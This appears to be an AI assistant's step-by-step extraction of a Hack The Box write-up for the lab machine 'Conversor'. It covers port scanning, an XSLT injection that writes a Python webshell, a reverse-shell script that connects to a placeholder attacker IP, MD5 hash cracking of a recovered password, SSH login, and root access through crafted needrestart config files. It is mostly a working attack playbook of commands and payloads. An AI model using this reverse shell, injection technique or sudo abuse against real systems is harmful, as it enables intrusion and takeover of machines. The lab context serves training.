The PDF is binary-encoded. I already have the full rendered text from the document context. Here's the complete line-by-line extraction of everything in the writeup:

---

## HTB — Conversor (10.10.11.92) — Full Process Extraction

---

### 📌 TL;DR / Highlights

```
Target IP     : 10.10.11.92
OS            : Linux (Hack The Box lab)
Open Ports    : 22/tcp (SSH), 80/tcp (HTTP)
User Creds    : fismathack : Keepmesafeandwarm
Hash (MD5)    : 5b5c3ac3a1c897c94caad48e6c71fdec → Keepmesafeandwarm
Foothold      : XSLT Injection → write Python webshell to webroot
PrivEsc       : sudo needrestart -c <crafted_config> → root shell
```

---

### STEP 1 — Host Setup

```bash
# Add target to /etc/hosts on attacker machine
sudo tee -a /etc/hosts <<< "10.10.11.92 conversor.htb"
```

---

### STEP 2 — Port Scan / Reconnaissance

```bash
nmap -p- -T4 10.10.11.92
```

```
Results:
  22/tcp  open  ssh    OpenSSH 8.9p1
  80/tcp  open  http   Apache/2.4.52
```

---

### STEP 3 — Web App Discovery

```
- Browse to: http://conversor.htb
- App accepts user-supplied XSLT files for processing
- XSLT processor runs server-side
- Vulnerable to XSLT Injection
- Reference: PayloadsAllTheThings — XSLT Injection payloads
```

---

### STEP 4 — XSLT Injection → Write Webshell

```
Technique:
  - Craft malicious XSLT payload using extension elements
    (e.g. ptswarm:document or equivalent)
  - Payload instructs server to write a Python file
    into: /var/www/conversor.htb/scripts/shell.py
  - Upload/submit the XSLT through the vulnerable endpoint
  - Trigger the XSLT processor
```

```
Confirm file creation:
  curl http://conversor.htb/scripts/shell.py
  # or visit in browser to verify content
```

---

### STEP 5 — Python Reverse Shell Payload (written via XSLT)

```python
# Observed shell.py content (replace placeholders for your lab):
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("[ATTACKER_IP]", [ATTACKER_PORT]))

# Duplicate file descriptors and exec interactive shell
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

---

### STEP 6 — Credentials Discovery (users.db)

```
- XSLT payload also exposed / allowed reading of: users.db (or user.db)
- Database contained an INSERT statement:
```

```sql
INSERT INTO users VALUES(1,'fismathack','5b5c3ac3a1c897c94caad48e6c71fdec');
```

```
Hash type    : MD5
Cracking     : Online cracking service OR wordlist-based (hashcat/john)
Plaintext    : Keepmesafeandwarm
```

```bash
# hashcat example (if cracking offline):
hashcat -m 0 5b5c3ac3a1c897c94caad48e6c71fdec /usr/share/wordlists/rockyou.txt
# Result: Keepmesafeandwarm
```

---

### STEP 7 — Initial Access via SSH

```bash
ssh fismathack@10.10.11.92
# Password: Keepmesafeandwarm
```

```bash
# Grab user flag
cat ~/user.txt
```

---

### STEP 8 — Enumeration for Privilege Escalation

```bash
# Check sudo permissions
sudo -l
```

```
Result:
  User fismathack may run:
    /usr/sbin/needrestart -c <file>   (as root, no password)
```

---

### STEP 9 — Privilege Escalation via needrestart

**How it works:**
`needrestart` accepts a `-c <config_file>` argument. When parsing the config, it can execute arbitrary commands — abused to spawn a root shell.

---

**Variant A — `system()` directive:**

```bash
cat > /tmp/exploit.conf << 'EOF'
BEGIN { system("/bin/sh") }
[needrestart]
EOF

sudo /usr/sbin/needrestart -c /tmp/exploit.conf
# → drops into root shell
```

---

**Variant B — `exec` with preserved privileges:**

```bash
echo 'exec "/bin/sh","-p";' > /tmp/con.conf

sudo /usr/sbin/needrestart -c /tmp/con.conf
# → becomes root
```

---

### STEP 10 — Root Flag

```bash
# After getting root shell from either variant:
whoami
# root

cat /root/root.txt
```

---

### 📋 Complete Repro Checklist (Concise)

| Step | Action |
|------|--------|
| 1 | Add `10.10.11.92 conversor.htb` to `/etc/hosts` |
| 2 | `nmap -p- -T4 10.10.11.92` → confirm 22, 80 open |
| 3 | Browse `http://conversor.htb` → find XSLT upload endpoint |
| 4 | Craft XSLT payload → write `shell.py` to `/var/www/conversor.htb/scripts/` |
| 5 | Verify shell at `http://conversor.htb/scripts/shell.py` |
| 6 | Extract `users.db` via XSLT or webshell → crack MD5 hash |
| 7 | `ssh fismathack@10.10.11.92` with `Keepmesafeandwarm` |
| 8 | `cat ~/user.txt` → user flag |
| 9 | `sudo -l` → confirm `needrestart -c` allowed as root |
| 10 | Write `/tmp/exploit.conf` → `sudo /usr/sbin/needrestart -c /tmp/exploit.conf` |
| 11 | `cat /root/root.txt` → root flag ✅ |